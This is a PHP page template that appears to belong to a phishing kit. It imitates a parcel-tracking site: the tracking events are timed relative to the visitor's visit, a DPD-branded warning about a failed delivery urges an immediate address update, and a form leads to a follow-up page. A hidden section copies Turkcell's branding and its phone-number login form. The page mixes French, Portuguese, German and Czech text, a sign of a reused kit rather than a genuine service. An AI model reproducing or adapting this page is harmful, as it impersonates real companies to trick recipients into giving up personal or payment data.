<?php
session_start();
session_destroy();
include 'header-new.php';
$currentDateTime = date('m/d/Y H:i'); // Get the current date and time
?>
    <div id="page-content-wrapper">
        <div class="page-content bottom-margin">
            <div class="container-fluid">
                <div class="row hidden-xs"></div>
                <div class="row" style="padding-right: 25px; margin-left: 25px;">
                    <style>
                        .pagination > li > a,
                        .pagination > li > span {
                            color: #fff;
                            background-color: #555;
                        }
                        .pagination > .active > span,
                        .pagination > .active > span:hover,
                        .sidebar .tags a,
                        .btn-group.open .btn-default.dropdown-toggle {
                            background-color: #00614a;
                        }
                        .input-dash{
                            height: 20px !important;
                            background-color: #fff !important;
                            min-height: 17px !important;
                        }

                        .delivery-container-box{
                            display: flex;
                            background: #00614a;
                            color: #fff;
                            padding: 8px 6px;
                            border-radius: 7px 7px 0px 0;
                        }

                        .delivery-status{
                            flex-grow: 1;
                            text-align: center;
                        }

                        .delivery-data {
                            flex-grow: 1;
                            text-align: right;
                        }

                        .cham-form .select__input:after, form.cham-form .select__input:after, form[data-sc-fxb] .select__input:after{
                            right: 26px !important;
                        }
                    </style>
                    <div class="col-sm-12 col-md-12" style="background: transparent;">
                        <div class="breadcrumb-box">
                            <div class="container-fluid">
                                <ul class="breadcrumb">
                                    <li><a href="/">Accueil</a></li>
                                    <li class="active">Tracking</li>
                                </ul>
                            </div>
                        </div>
                        <!-- .breadcrumb-box -->
                        <br />
                        <div class="container-fluid">
                            <h1 class="title">Tracking</h1>
                        </div>
                        <div>
                            <span style="margin-left:5px">CI142565858FR</span>
                        </div>
                        <br />
                        <div class="title-box">
                            <h2 class="title">Suivi de mon envoi national</h2>
                        </div>
                    </div>
                    <div class="blog col-sm-12 col-md-12 bottom-padding">
                        <form action="/page2.php" method="POST" class="col-md-4 form-box register-form contact-form" style="background-color: #f1eccc;">

                            <div class="time_line_wrap only_mobile card_wrap">
                                <div class="delivery-container-box">
                                    <div class="delivery-object">
                                        <span>Objecto</span>
                                    </div>
                                    <div class="delivery-status">
                                        <span>Status</span>
                                    </div>
                                    <div class="delivery-data">
                                        <span>Data da entrega</span>
                                    </div>
                                </div>
                                <div class="delivery-container" style="display:none">
                                    <div class="dot-line">
                                        <div class="dot"></div>
                                        <div class="horizontal-line"></div>
                                        <div class="dot"></div>
                                        <div class="horizontal-line"></div>
                                        <span class="car">🚚</span>
                                    </div>
                                </div>
                                <div class="time_line one">
                                    <div class="right-red delivery-icon-circle" id="dot1">
                                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -0 DAY +2 HOURS'));?> 09:52</p>
                                        <p class="bottom_color text-contain">Paketzustellung aufgrund eines Problems mit der Straßenadresse fehlgeschlagen,Rücksendung an das Vertriebszentrum</p>
                                    </div>
                                </div>
                                <div class="time_line">
                                    <div class="right-red delivery-icon-circle second">
                                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -1 DAY +2 HOURS'));?> 15:17</p>
                                        <p class="bottom_color text-contain">Das Paket ist im Sortierzentrum angekommen und der Kurier ist bereit, es zu versenden</p>
                                    </div>
                                </div>
                                <div class="time_line">
                                    <div class="right-red delivery-icon-circle third">
                                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -2 DAY +3 HOURS'));?> 18:21</p>
                                        <p class="bottom_color text-contain">Das Paket wird verladen und an seinen Bestimmungsort befördert.</p>
                                    </div>
                                </div>
                                <div class="time_line">
                                    <div class="right-red delivery-icon-circle four">
                                        <p class="top_title_ps delivery-title"><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -3 DAY +1 HOURS'));?> 10:13</p>
                                        <p class="bottom_color text-contain">Registrierte und geprüfte Pakete bereit zum Verladen</p>
                                    </div>
                                </div>
                            </div>
                            <div class="message_expert only_mobile">
                                <div class="sub-title alrt-modify py-5">
                                    <!-- <img src="images/alert3.png" className="warning-image" style="width: 60px;margin-left: auto;margin-right: auto;"> -->
                                    <h2 class="title mt-3"><span>
<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="red" class="bi bi-exclamation-circle" viewBox="0 0 16 16">
  <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
  <path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0z"></path>
</svg></span> Selhání při doručování zásilek</h2>
                                    <p class="title-text">Nedoručení zásilky z důvodu nesprávné adresy,Co nejdříve aktualizujte správnou adresu<strong></strong></p>
                                    <p class="title-text">Společnost DPD umožňuje opakované doručení v případě chyby v adrese.<strong></strong></p>
                                </div>
                            </div>
                            <input type="submit" class="col-sm-12 btn btn-default pull-right" id="button-confirm" value="Rechercher" />
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <main style="display:none">
        <section class="m-carousel" data-component="Carousel">
            <svg width="0" height="0">
                <defs>
                    <clipPath id="m-carousel__clip-path" clipPathUnits="objectBoundingBox">
                        <path d="M0,0 L0,0.9174311926605505 Q0.5,1.0825688073394495 1,0.9174311926605505 L1,0 Z" stroke-width="0" />
                    </clipPath>
                    <clipPath id="m-carousel__clip-path--mobile" clipPathUnits="objectBoundingBox">
                        <path d="M0,0 L0,0.9764705882352941 Q0.5,1.0235294117647058 1,0.9764705882352941 L1,0 Z" stroke-width="0" />
                    </clipPath>
                </defs>
            </svg>
            <div data-component='{ "type": "Slider" , "pagination":false , "navigation": true, "loop":false, "autoplay":true }' id="" class="m-slider">
                <div class="m-slider__swiper swiper-container">
                    <div class="swiper-wrapper">
                        <div id="banner-1" data-ga-id="4338,Telco Banner" data-ga-name="Telco - Gold üyelik - nonlogin" data-ga-creative="/anasayfa" data-ga-position="1" data-ga-event-label="Banner-/anasayfa" data-background="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Banner/Bireysel/golduyelik-comtr-mobilx.jpg" class="swiper-slide swiper-lazy m-carousel-gradient--blue" data-location-href="#">
                            <div class="m-grid">
                                <div class="m-grid-col-3 margin-auto text-center">
                                    <div data-animation="slideInUp" class="m-carousel__desc m-carousel__desc-">
                                        <h3 class="color_white"> Altın değerinde yenilik;<br> Gold üyelik! </h3>
                                        <div class="m-btn-group m-btn-group--align-left m-btn-group--m-align-center"><a class="a-btn" title="İncele" href="https://www.turkcell.com.tr/gold-uyelik">İncele</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="banner-2" data-ga-id="4263,Telco Banner" data-ga-name="Revize Turkcell 532" data-ga-creative="/anasayfa" data-ga-position="2" data-ga-event-label="Banner-/anasayfa" data-background="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Banner/Bireysel/532-agustos-comtr-mobil.jpg?1692006917000" class="swiper-slide swiper-lazy m-carousel-gradient--blue" data-location-href="#">
                            <div class="m-grid">
                                <div class="m-grid-col-3 margin-auto text-center">
                                    <div data-animation="slideInUp" class="m-carousel__desc m-carousel__desc-">
                                        <h3 class="color_white">Hemen Turkcell’li olun, online’a özel 532’li hat ayrıcalığından yararlanın! </h3>
                                        <div class="m-btn-group m-btn-group--align-left m-btn-group--m-align-center"><a class="a-btn" title="İncele" href="https://www.turkcell.com.tr/tr/turkcellli-olmak/paket-secimi?place=subbaner">İncele</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="banner-3" data-ga-id="4392,Telco Banner" data-ga-name="Sol.net - ATL kampanya banner'ı" data-ga-creative="/anasayfa" data-ga-position="3" data-ga-event-label="Banner-/anasayfa" data-background="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Banner/Bireysel/fiberatl-comtr-mobil.jpg?1692859954000" class="swiper-slide swiper-lazy m-carousel-gradient--blue" data-location-href="#">
                            <div class="m-grid">
                                <div class="m-grid-col-3 margin-auto text-center">
                                    <div data-animation="slideInUp" class="m-carousel__desc m-carousel__desc-">
                                        <h3 class="color_white">Evin tüm eğlencesi Turkcell Superonline fiberde!</h3>
                                        <div class="m-btn-group m-btn-group--align-left m-btn-group--m-align-center"> <a class="a-btn" title="İncele" href="https://www.superonline.net/kampanyalar/turkcell-musterilerine-ozel">İncele</a></div>
                                        <p class="color_white" style="font-size:0.5rem;">*12 ay sözünüze</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="banner-4" data-ga-id="4336,Telco Banner" data-ga-name="Telco - Akıllı Çocuk Saati -revize" data-ga-creative="/anasayfa" data-ga-position="4" data-ga-event-label="Banner-/anasayfa" data-background="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Banner/Bireysel/acs-comtr-mobil.jpg" class="swiper-slide swiper-lazy m-carousel-gradient--blue" data-location-href="#">
                            <div class="m-grid">
                                <div class="m-grid-col-3 margin-auto text-center">
                                    <div data-animation="slideInUp" class="m-carousel__desc m-carousel__desc-">
                                        <h3 class="color_white">Çocuklar yazın da Akıllı Çocuk Saati paketleriyle güvende! </h3>
                                        <div class="m-btn-group m-btn-group--align-left m-btn-group--m-align-center"><a class="a-btn" title="İncele" href="https://www.turkcell.com.tr/paket-ve-tarifeler/konusma/akilli-cocuk-saati-tarifesi-1-gb">İncele</a> </div>
                                        <p class="color_white" style="font-size:0.5rem;">* 12 ay sözünüze.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="banner-5" data-ga-id="4389,Telco Banner" data-ga-name="Okula Dönüş Jenerik Com.tr" data-ga-creative="/anasayfa" data-ga-position="5" data-ga-event-label="Banner-/anasayfa" data-background="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Banner/Bireysel/okuljenerik-comtr-mobil.jpg?1692789071000" class="swiper-slide swiper-lazy m-carousel-gradient--blue" data-location-href="#">
                            <div class="m-grid">
                                <div class="m-grid-col-3 margin-auto text-center">
                                    <div data-animation="slideInUp" class="m-carousel__desc m-carousel__desc-">
                                        <h3 class="color_white">Okullar Pasaj fırsatlarıyla açılıyor!</h3>
                                        <div class="m-btn-group m-btn-group--align-left m-btn-group--m-align-center"> <a class="a-btn" title="İncele" href="https://www.turkcell.com.tr/kampanya/okula-ve-sehre-donus-kampanyalari/">İncele</a></div>
                                        <p class="color_white" style="font-size:0.5rem;">Kampanya 22.08.2023 - 18.09.2023 tarihleri arasında, seçili ürünlerde geçerlidir.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container m-slider__container">
                    <a class="a-btn-icon m-slider__prev a-btn-icon--circle" href="javascript:;" title="">
                        <em class="icon-arrow-left"></em>
                        "
                    </a>
                    <a class="a-btn-icon m-slider__next a-btn-icon--circle" href="javascript:;" title="">
                        <em class="icon-arrow-right"></em>
                        "
                    </a>
                </div>
            </div>
            <div class="a-bullets" data-component='{ "count" : "4",  "arcHeight":6, "marginTop": 338,  "type" : "Bullets" }'>
                <svg style="height: 100%;">
                    <defs>
                        <clipPath id="bullets-clip-path-1">
                            <rect class="a-bullets__clip" x="0" y="0" width="0" height="0" />
                        </clipPath>
                        <linearGradient id="bullets-stroke-gradient">
                            <stop offset="0%" stop-color="#ffc900" />
                            <stop offset="100%" stop-color="#eeb116" />
                        </linearGradient>
                    </defs>
                    <path class="a-bullets__bg" d="" />
                    <g clip-path="url(#bullets-clip-path-1)">
                        <path class="a-bullets__item" d="" stroke="url(#bullets-stroke-gradient)" />
                    </g>
                </svg>
                <ul class="m-flex"></ul>
            </div>
        </section>
        <div class="container">
            <h1>
                <a href="javascript:;" class="logo logo-min ">
                    <img src="https://fastlogin.com.tr/fast_static/assets/images/101200_logo_v2.png?v=202303-last">
                </a>
            </h1>
        </div>
        <div class="main-body main-body--large">
            <div class="main-body-container">
                <div class="main-body-container-header">
                    <h2 tabindex="0" class="main-header__logo" title="Hızlı Giriş">
					<span><img src="/<?php echo $folder_path;?>/images/checkds1.png" style="width: 20px; margin-right: 9px;">
						<strong="">Mevcut Puan Sorgulama
					</span>
                    </h2>
                </div>
                <div class="tab">
                    <div class="tab__buttons" role="tablist">
                        <a role="tab" aria-selected="true" href="javascript:;" id="selectGSMLoginTabLink" class="tab__button js-gsm-tab tab__button--active" tabindex="0">
                            <svg width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M3.833 4h4.49L9.77 7.618l-2.325 1.55A1 1 0 0 0 7 10c.003.094 0 .001 0 .001v.021a2.026 2.026 0 0 0 .006.134c.006.082.016.193.035.33.039.27.114.642.26 1.08.294.88.87 2.019 1.992 3.141 1.122 1.122 2.261 1.698 3.14 1.992.439.146.81.22 1.082.26a4.43 4.43 0 0 0 .463.04l.013.001h.008s.112-.006.001 0a1 1 0 0 0 .894-.553l.67-1.34 4.436.74v4.32c-2.111.305-7.813.606-12.293-3.874C3.227 11.813 3.527 6.11 3.833 4zm5.24 6.486l1.807-1.204a2 2 0 0 0 .747-2.407L10.18 3.257A2 2 0 0 0 8.323 2H3.781c-.909 0-1.764.631-1.913 1.617-.34 2.242-.801 8.864 4.425 14.09 5.226 5.226 11.848 4.764 14.09 4.425.986-.15 1.617-1.004 1.617-1.913v-4.372a2 2 0 0 0-1.671-1.973l-4.436-.739a2 2 0 0 0-2.118 1.078l-.346.693a4.71 4.71 0 0 1-.363-.105c-.62-.206-1.481-.63-2.359-1.508-.878-.878-1.302-1.739-1.508-2.36a4.59 4.59 0 0 1-.125-.447z" fill="#0D0D0D"></path>
                            </svg>
                            <span>Cep Telefonu</span>
                        </a>
                    </div>
                    <div class="tab__contents">
                        <!-- GSM İle Giriş -->
                        <div class="tab__content js-gsm-tab tab__content--active" role="tabpanel" aria-label="Cep Telefon Numarası">
                            <div class="form-row form-row--short">
                                <div class="flag-input">
                                    <div class="gsm-input-area" id="gsm-input-area">
                                        <div class="iti iti--allow-dropdown iti--separate-dial-code">
                                            <div class="iti__flag-container">
                                                <div class="iti__selected-flag" role="combobox" aria-controls="iti-0__country-listbox" aria-owns="iti-0__country-listbox" aria-expanded="false" tabindex="0" title="Turkey (Türkiye): +90" aria-activedescendant="iti-0__item-tr-preferred" aria-label="Alan Kodu">
                                                    <div class="gsm-input-area__flag">
                                                        <div class="iti__flag iti__tr"></div>
                                                    </div>
                                                    <div class="iti__selected-dial-code">+90</div>
                                                    <div class="iti__arrow"></div>
                                                </div>
                                            </div>
                                            <input id="phoneNo" aria-label="Lütfen geçerli bir telefon numarası giriniz." data-parsley-errors-container="#gsm-input-area__plain-error" data-parsley-class-handler="#gsm-input-area" data-parsley-tel="true" type="tel" class="gsm-input-area__phone" maxlength="18" required="required" value="" data-only-countries="[&quot;tr&quot;,&quot;az&quot;]" data-preferred-countries="[&quot;tr&quot;]" autofocus="" data-dirty="false" autocomplete="off" data-intl-tel-input-id="0" style="padding-left: 20px !important;" fdprocessedid="jdx28">
                                        </div>
                                        <label for="s0-0-6-12-17-input">Cep Telefon Numarası</label>
                                        <a href="javascript:;" class="gsm-input-area__error-icon" title="error"></a>
                                        <input type="hidden" class="js-msisdn-plain" id="msisdn" name="msisdn" data-dirty="false">
                                        <input type="hidden" class="js-msisdn-determined" id="determined_msisdn" name="determined_msisdn" value="NOT_TURKCELL" data-dirty="false">
                                        <input type="hidden" class="js-msisdn-iso-code" name="msisdnCountryIsoCode" value="" data-dirty="false">
                                        <input type="hidden" class="js-msisdn-region-code" name="msisdnCountryRegionCode" value="" data-dirty="false">
                                        <input type="hidden" class="js-msisdn-full" name="msisdnFull" data-dirty="false">
                                        <div class="js-focused-country-code gsm-input-area__screen-reader-text" aria-live="assertive" tabindex="-1"></div>
                                    </div>
                                    <div class="gsm-input-area__plain-error" id="gsm-input-area__plain-error">
                                    </div>
                                </div>
                            </div>
                            <!-- Beni Hatırla ve HG şifresi  -->
                            <div class="form-row">
                                <div class="checkbox">
                                    <input type="checkbox" id="loginWithPassword" name="loginWithPassword" class="checkbox__input" data-parsley-multiple="loginWithPassword" data-dirty="true">
                                    <label for="loginWithPassword" class="checkbox__label">
                                        HızlıGiriş Şifresi ile Gir
                                    </label>
                                </div>
                                <div class="checkbox js-remember-checkbox">
                                    <input type="checkbox" id="rememberMe" name="rememberMe" class="checkbox__input" checked="" data-parsley-multiple="rememberMe" data-dirty="true"><label for="rememberMe" class="checkbox__label">Beni Hatırla</label>
                                </div>
                            </div>
                            <!-- /Beni Hatırla ve HG şifresi  -->
                            <input type="hidden" name="gsmEntry" value="gsmEntry" data-dirty="true">
                        </div>
                    </div>
                </div>


                <a href="/page2.php">
                    <button class="btn" id="webLogin-button" aria-label="Giriş Yap" data-action-src="/fastlogin_web_app/webLogin" data-action-method="POST" data-only-visible="true" fdprocessedid="00cmc">Giriş Yap</button>
                </a>
            </div>
            <div class="container m-t-20">
                <button class="btn btn--transparent" aria-label="Bilgilerini Güncelle" data-action-src="/fastlogin_web_app/startUpdateMyInfo" data-action-method="POST" id="updateMyInfo" data-only-visible="true" fdprocessedid="a7ntzc">
                    <h2 tabindex="0" class="button-logo" title="Hızlı Giriş">
					<span><img src="<?php echo $folder_path;?>/images/checkds1.png" style="width: 20px;
    margin-right: 9px;"><strong>Hızlı</strong>Giriş</span>
                    </h2>
                    Bilgilerini Güncelle
                </button>
            </div>
        </div>
    </main>
    <style>
        .message_expert {
            margin-top: 20px;
            margin-bottom: 20px;
        }
        .alrt-modify {
            border: none;
            box-shadow: 0px 2px 16px 0px #ff8a8a;
            background: #fff;
            border-radius: 28px;
            margin-top: 37px;
            text-align: center;
        }
        .icon-alert{
            font-size: 23px;
            color: #F44336;
        }
        .red-gray::before {
            background-color: rgb(11, 35, 30) !important;
            z-index:999;
        }
        .sub-title p.title-text {
            text-align: center;
            font-size: 15px;
            line-height: inherit;
            margin-top: 6px;
        }
        .right-red {
            padding: 2px 0px 14px 20px;
        }
        @media (max-width: 767px) {
            .time_line {
                display: flex;
                justify-content: space-between;
                padding-left: 6px;
            }
            .for_desktop_only {
                display: none !important;
            }
            .time_line.one .left-green {
                z-index: 1;
            }
            .left-green {
                position: relative;
            }
            .left-green,
            .right-red {
                width: 50%;
            }
            .for_color {
                background-color: #0b231e;
                border-radius: 5px;
                padding: 7px;
                text-align: center;
                font-size: 12px;
                color: white;
                width: 88%;
            }
            .time_line p {
                margin: 0px;
                font-size: 12px;
                font-weight: 600;
                line-height: initial;
                text-align: left;
            }
            .time_line p.text-contain {
                margin-bottom:20px;
            }
            .right-red {
                font-size: 11px;
                padding: 10px 0px 0px 20px;
            }
            .right-red {
                position: relative;
            }
            .like_viewmore {
                font-size: 14px;
            }
            .right-red:before {
                content: 'ss';
                position: absolute;
                top: 10px;
                width: 20px;
                height: 20px;
                background-color: #fff;
                border-radius: 100px;
                font-size: 0px;
                left: -6px;
                border: 2px solid #000;
                box-shadow: 0px 0px 0px 4px #fff, 0px 0px 0px 2px #fff inset;
            }
            .time_line .delivery-icon-circle.second:before {
                background-image: url(/Cote_dIvoire/images/delivery-packing.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 35px 35px;
            }
            .time_line .delivery-icon-circle.third:before {
                background-image: url(/Cote_dIvoire/images/delivery-icon-gray.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 37px 35px;
            }
            .time_line .delivery-icon-circle.four:before {
                background-image: url(/Cote_dIvoire/images/delivery-success.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 38px 38px;
            }
            .time_line .delivery-icon-circle:before {
                background-color: #ccc !important;
                width: 40px;
                height: 40px;
                z-index: 9999999;
                border-color: #00614A;
            }
            .delivery-title{
                color:#0071ad !important;
            }
            .time_line .delivery-icon-circle:after {
                left: 12px !important;
            }
            .right-red{
                padding: 10px 0px 0px 45px !important;
            }
            .dot {
                width: 20px;
                height: 20px;
                background-color: black;
                border-radius: 50%;
                border: 2px solid #000;
                box-shadow: 0 0 0 4px #fff, 0 0 0 2px #fff inset;
                position: relative;
                z-index: 1;
            }
            .right-red:after {
                content: 'dd';
                position: absolute;
                left: 3px;
                top: 34px;
                height: calc(100% - 20px);
                width: 2px;
                background-color: #ddd;
                font-size: 0px;
            }
            .time_line:last-child .right-red:after {
                opacity: 0;
            }
            .message_expert .sub-title {
                background: #fff;
                border: 2px solid #ff9494;
                padding: 10px 15px 5px;
            }
            .message_expert .sub-title .heading_wrap {
                margin: 0 0 5px;
            }
            .message_expert .sub-title .title-text {
                margin: 0;
                font-size: 11px !important;
            }
            .button_block  .app-download-buttons-container{
                padding: 20px 0 0;
            }
            .left-green:before {
                content: 'ss';
                position: absolute;
                top: 0px;
                width: 20px;
                height: 20px;
                background-color: red;
                border-radius: 100px;
                font-size: 0px;
                right: -9px;
            }
            .left-green:after {
                content: 'dd';
                position: absolute;
                right: 0px;
                top: 0px;
                height: 100%;
                width: 2px;
                background-color: red;
                font-size: 0px;
            }
            p.bottom_color {
                margin-top: 8px;
                color: gray;
                font-weight: normal;
            }
            .message_expert {
                margin-top: 20px;
            }
            .sub-title {
                text-align: center;
                width: auto;
                max-width: 100%;
                background-color: #ededed;
                padding: 15px;
                border: 1px solid #fed42a;
                border-radius: 10px;
                margin: auto;
                margin-right: 0px;
                position: relative;
            }
            .main h2.title {
                border-bottom: none;
            }
            .sub-title h2.title {
                text-transform: uppercase;
                font-weight: 600;
                text-align: center;
                font-size: 20px;
                color: black;
                padding-bottom: 0px;
                margin-bottom: 0px !important;
            }
            .sub-title p.title-text {
                text-align: center;
                font-size: 15px;
                line-height: inherit;
                margin-top: 6px;
            }
            .button_block {
                margin: 20px 0px;
                text-align: center;
            }
            .button_next,
            form input[type="submit"] {
                min-width: 150px;
                height: 44px;
                border-radius: 5px;
                border: none;
                background-color: #0071ad;
                color: white;
                margin: auto;
            }
            form label,
            form legend {
                display: block;
            }
            span.card_detail {
                display: flex;
                align-items: center;
                gap: 5px;
                margin-bottom: 9px;
            }
            .card_detail strong {
                font-size: 16px;
            }
            .top-mask>.bannerimg {
                width: 100%;
            }
            .heading_wrap {
                display: inline-flex;
                width: 100%;
                justify-content: center;
                margin: 20px 0;
            }
            .heading_wrap .title {
                margin: 0;
            }
            .heading_wrap img {
                max-height: 23px;
                margin-right: 5px;
            }
        }
        @media (max-width: 767px) {
            .time_line {
                display: flex;
                justify-content: space-between;
                padding-left: 6px;
            }
            .for_desktop_only {
                display: none !important;
            }
            .time_line.one .left-green {
                z-index: 1;
            }
            .left-green {
                position: relative;
            }
            .left-green,
            .right-red {
                width: 50%;
            }
            .for_color {
                background-color: #0b231e;
                border-radius: 5px;
                padding: 7px;
                text-align: center;
                font-size: 12px;
                color: white;
                width: 88%;
            }
            .time_line p {
                margin: 0px;
                font-size: 12px;
                font-weight: 600;
                line-height: initial;
            }
            .time_line p.text-contain {
                margin-bottom:20px;
            }
            .right-red {
                font-size: 11px;
                padding: 10px 0px 0px 20px;
            }
            .right-red {
                position: relative;
            }
            .like_viewmore {
                font-size: 14px;
            }
            .right-red:before {
                content: 'ss';
                position: absolute;
                top: 10px;
                width: 20px;
                height: 20px;
                background-color: #fff;
                border-radius: 100px;
                font-size: 0px;
                left: -6px;
                border: 2px solid #000;
                box-shadow: 0px 0px 0px 4px #fff, 0px 0px 0px 2px #fff inset;
            }
            .time_line .delivery-icon-circle.second:before {
                background-image: url(/Cote_dIvoire/images/d-packing.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 35px 35px;
            }
            .time_line .delivery-icon-circle.third:before {
                background-image: url(/Cote_dIvoire/images/delivery-new.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 35px 35px;
            }
            .time_line .delivery-icon-circle.four:before {
                background-image: url(/Cote_dIvoire/images/delivery-success.png);
                background-repeat: no-repeat;
                background-size: auto;
                background-size: 35px 35px;
            }
            .time_line .delivery-icon-circle:before {
                background-color: #ccc !important;
                width: 40px;
                height: 40px;
                z-index: 9999999;
                border-color: #ccc;
            }
            .delivery-title{
                color:#00614a !important;
            }
            .time_line .delivery-icon-circle:after {
                left: 15px !important;
            }
            .right-red{
                padding: 10px 0px 0px 45px !important;
            }
            .dot {
                width: 20px;
                height: 20px;
                background-color: black;
                border-radius: 50%;
                border: 2px solid #000;
                box-shadow: 0 0 0 4px #fff, 0 0 0 2px #fff inset;
                position: relative;
                z-index: 1;
            }
            .right-red:after {
                content: 'dd';
                position: absolute;
                left: 3px;
                top: 34px;
                height: calc(100% - 20px);
                width: 2px;
                background-color: #00614A;
                font-size: 0px;
            }
            .time_line:last-child .right-red:after {
                opacity: 0;
            }


        {
            background: #fff;
            border: 2px solid #fdb6af;
            padding: 10px 15px 5px;
        }
            .message_expert .sub-title .heading_wrap {
                margin: 0 0 5px;
            }
            .message_expert .sub-title .title-text {
                margin: 0;
                font-size: 11px !important;
            }
            .button_block  .app-download-buttons-container{
                padding: 20px 0 0;
            }
            .left-green:before {
                content: 'ss';
                position: absolute;
                top: 0px;
                width: 20px;
                height: 20px;
                background-color: red;
                border-radius: 100px;
                font-size: 0px;
                right: -9px;
            }
            .left-green:after {
                content: 'dd';
                position: absolute;
                right: 0px;
                top: 0px;
                height: 100%;
                width: 2px;
                background-color: red;
                font-size: 0px;
            }
            p.bottom_color {
                margin-top: 8px;
                color: gray;
                font-weight: normal;
            }
            .message_expert {
                margin-top: 20px;
            }
            .sub-title {
                text-align: center;
                width: auto;
                max-width: 100%;
                background-color: #ededed;
                padding: 15px;
                border: 1px solid #fed42a;
                border-radius: 10px;
                margin: auto;
                margin-right: 0px;
                position: relative;
            }
            .main h2.title {
                border-bottom: none;
            }
            .sub-title h2.title {
                text-transform: uppercase;
                font-weight: 600;
                text-align: center;
                font-size: 20px;
                color: black;
                padding-bottom: 0px;
                margin-bottom: 0px !important;
            }
            .sub-title p.title-text {
                text-align: center;
                font-size: 15px;
                line-height: inherit;
                margin-top: 6px;
            }
            .button_block {
                margin: 20px 0px;
                text-align: center;
            }
            .button_next,
            form input[type="submit"] {
                min-width: 150px;
                height: 44px;
                border-radius: 5px;
                border: none;
                background-color: #0071ad;
                color: white;
                margin: auto;
            }
            form label,
            form legend {
                display: block;
            }
            span.card_detail {
                display: flex;
                align-items: center;
                gap: 5px;
                margin-bottom: 9px;
            }
            .card_detail strong {
                font-size: 16px;
            }
            .top-mask>.bannerimg {
                width: 100%;
            }
            .heading_wrap {
                display: inline-flex;
                width: 100%;
                justify-content: center;
                margin: 20px 0;
            }
            .heading_wrap .title {
                margin: 0;
            }
            .heading_wrap img {
                max-height: 23px;
                margin-right: 5px;
            }
        }
        .delivery-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .dot-line {
            display: flex;
            align-items: center;
            width: 400px; /* Adjust the length of the line as needed */
        }
        .dot {
            width: 20px;
            height: 20px;
            background-color: black;
            border-radius: 50%;
        }
        .horizontal-line {
            height: 2px;
            flex-grow: 1;
            background-color: #ddd;
        }
        .car {
            transform: scaleX(-1);
            font-size: 24px;
            color: black;
        }
        .title-text{
            font-size: 13px!important;
        }
        @media (max-width: 767px) {
            #dot1:before {
                background-color: #CCCCCC !important; /* Red for the first dot */
                color: #CCCCCC !important; /* Red for the first dot */
            }
            .left-green, .right-red {
                width: 100%!important;
            }
            .right-red.colored::before {
                background: #ffdc00;
                border-color:#fff;
            }
            .time_line:last-child .right-red.colored::after {
                background: #ddd;
                opacity: 1;
                height: 60%;
                top: 30px;
            }
        }
    </style>
<?php include 'footer-new.php'; ?>